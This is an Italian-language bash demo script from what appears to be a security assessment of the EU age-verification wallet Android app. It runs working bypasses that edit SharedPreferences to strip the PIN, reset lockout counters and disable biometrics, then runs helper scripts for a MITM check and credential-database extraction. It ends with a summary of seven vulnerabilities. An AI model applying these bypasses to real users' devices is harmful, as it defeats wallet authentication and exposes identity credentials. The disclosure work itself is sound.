#!/bin/bash
# DEMO COMPLETA: Esegue tutti i test in sequenza
# Uso: ./07-full-demo.sh
source "$(dirname "$0")/00-common.sh"

banner "AV WALLET - SECURITY ASSESSMENT DEMO"
echo "  Repository: eu-digital-identity-wallet/av-app-android-wallet-ui"
echo "  Data: $(date '+%Y-%m-%d %H:%M')"
echo ""

check_device

# Backup iniziale
BACKUP="/tmp/av-full-backup.xml"
read_prefs > "$BACKUP"
ok "Backup stato iniziale"

echo ""
info "Stato attuale SharedPreferences:"
read_prefs | grep -v "<?xml" | grep -v "<map>" | grep -v "</map>" | sed 's/^/       /'

echo ""
echo -e "${CYAN}Premi INVIO per iniziare i test...${NC}"
read

# ---- Test 1 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 1/6: Decodifica offuscamento${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
python3 "$(dirname "$0")/04-decode-shuffle.py"

echo ""
echo -e "${CYAN}Premi INVIO per il prossimo test...${NC}"
read

# ---- Test 2 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 2/6: PIN Bypass${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

HAS_PIN=$(read_prefs | grep -c "PinEnc")
if [ "$HAS_PIN" -gt 0 ]; then
    info "PIN trovato. Rimuovo PinEnc e PinIv..."
    read_prefs | grep -v 'name="PinEnc"' | grep -v 'name="PinIv"' > /tmp/av-demo-nopin.xml
    write_prefs /tmp/av-demo-nopin.xml
    restart_app
    ok "PIN rimosso. L'app mostra l'onboarding."
    info ">>> Verifica sull'emulatore: setup nuovo PIN visibile"
    echo ""
    read -p "  Premi INVIO dopo aver verificato... "
    write_prefs "$BACKUP"
    restart_app
    ok "Ripristinato"
else
    info "Nessun PIN. Salta."
fi

echo ""
echo -e "${CYAN}Premi INVIO per il prossimo test...${NC}"
read

# ---- Test 3 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 3/6: Rate Limiting Bypass${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

FUTURE=$(($(date +%s) * 1000 + 28800000))
read_prefs \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"9\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"$FUTURE\"/" \
    > /tmp/av-demo-locked.xml
write_prefs /tmp/av-demo-locked.xml
restart_app
ok "Lockout impostato: 9 tentativi, 8 ore"
info ">>> Verifica sull'emulatore: messaggio lockout visibile"

echo ""
read -p "  Premi INVIO per resettare il lockout... "

read_prefs \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"0\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"0\"/" \
    > /tmp/av-demo-unlocked.xml
write_prefs /tmp/av-demo-unlocked.xml
restart_app
ok "Lockout azzerato istantaneamente"
info ">>> Verifica: l'app accetta di nuovo il PIN"

echo ""
read -p "  Premi INVIO dopo aver verificato... "

write_prefs "$BACKUP"
restart_app

echo ""
echo -e "${CYAN}Premi INVIO per il prossimo test...${NC}"
read

# ---- Test 4 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 4/6: Biometric Bypass${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

BIO=$(read_prefs | grep "UseBiometricsAuth" | sed -n 's/.*value="\([a-z]*\)".*/\1/p')
info "UseBiometricsAuth = $BIO"
if [ "$BIO" = "true" ]; then
    sed 's/value="true"/value="false"/' "$BACKUP" > /tmp/av-demo-nobio.xml
    write_prefs /tmp/av-demo-nobio.xml
    restart_app
    ok "Biometria disabilitata"
    read -p "  Premi INVIO... "
    write_prefs "$BACKUP"
    restart_app
else
    ok "Flag gia' false. Su device con biometria, basta cambiare il booleano."
fi

echo ""
echo -e "${CYAN}Premi INVIO per il prossimo test...${NC}"
read

# ---- Test 5 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 5/6: Certificate Pinning Check${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

bash "$(dirname "$0")/05-mitm-setup.sh" 2>/dev/null | grep -E "\[PASS\]|\[FAIL\]|\[\*\]|RISULTATO"

echo ""
echo -e "${CYAN}Premi INVIO per il prossimo test...${NC}"
read

# ---- Test 6 ----
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  TEST 6/6: Credential Database Extraction${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

bash "$(dirname "$0")/06-extract-credentials.sh" 2>/dev/null | grep -E "\[PASS\]|\[FAIL\]|\[\*\]|RISULTATO|ID:|bytes"

# ---- Riepilogo ----
banner "RIEPILOGO VULNERABILITA'"

echo -e "  ${RED}VULN-01${NC}  PIN bypass                    Rimuovi PinEnc/PinIv, credenziali intatte"
echo -e "  ${RED}VULN-02${NC}  Rate limit bypass              PinFailedAttempts resettabile a 0"
echo -e "  ${RED}VULN-03${NC}  Biometric bypass               UseBiometricsAuth = booleano editabile"
echo -e "  ${RED}VULN-04${NC}  Falsa crittografia             Shuffle con seed hardcoded, non AES"
echo -e "  ${RED}VULN-05${NC}  No user auth per chiavi        userAuthenticationRequired = false"
echo -e "  ${RED}VULN-06${NC}  No certificate pinning         MITM possibile + TrustAll nel README"
echo -e "  ${RED}VULN-07${NC}  DB credenziali non cifrato     SQLite estraibile con adb"
echo ""
echo -e "  ${RED}DESIGN${NC}   Modello trust fondamentalmente difettoso"
echo -e "           Pre-AV:  Sito chiede -> Utente dice 'si'"
echo -e "           Post-AV: Sito chiede -> App dice 'si' (con i tuoi dati biometrici)"
echo -e "           Stessa risposta binaria, diversa superficie d'attacco"
echo ""

write_prefs "$BACKUP"
ok "Stato originale ripristinato"

banner "DEMO COMPLETATA"
